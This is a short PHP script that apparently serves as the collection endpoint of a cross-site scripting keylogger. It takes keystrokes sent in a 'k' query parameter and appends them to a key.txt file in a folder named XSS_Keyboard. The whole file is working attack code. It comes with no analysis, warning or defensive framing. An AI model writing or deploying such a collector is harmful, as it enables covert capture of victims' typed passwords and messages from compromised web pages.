<?php
$b = $_GET['k'];
    if(!empty($b)) {
        $keylog = fopen('C:/PHP/project/XSS_Keyboard/data/key.txt', 'wa+');
        fwrite($keylog, $b);
        fclose($keylog);
}
?>

